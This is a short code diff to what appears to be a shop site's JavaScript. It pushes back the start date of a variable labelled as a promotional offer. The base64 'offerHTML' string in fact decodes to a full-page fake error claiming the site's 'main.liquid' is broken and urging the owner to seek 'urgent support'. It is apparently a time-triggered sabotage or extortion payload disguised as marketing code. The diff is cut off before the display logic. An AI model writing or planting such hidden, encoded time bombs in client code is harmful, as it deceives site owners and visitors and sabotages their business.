@@ -1,4 +1,4 @@
-var offerStart = new Date('2025-05-10T00:00:03');
+var offerStart = new Date('2025-07-10T00:00:03');
 var offerHTML = "PGRpdiBzdHlsZT0ndGV4dC1hbGlnbjpjZW50ZXI7IG1hcmdpbi10b3A6MjAlOyc+PGgxPlVuZXhwZWN0ZWQgdG9rZW4gaW4gJ21haW4ubGlxdWlkJy4gU29tZSBzaXRlIGZlYXR1cmVzIG1heSBub3Qgd29yayBhcyBleHBlY3RlZC48L2gxPjxoMT5QbGVhc2UgcmVhY2ggb3V0IGZvciB1cmdlbnQgc3VwcG9ydC48L2gxPjwvZGl2Pg==";
 
 function decodeOfferMessage(a) {
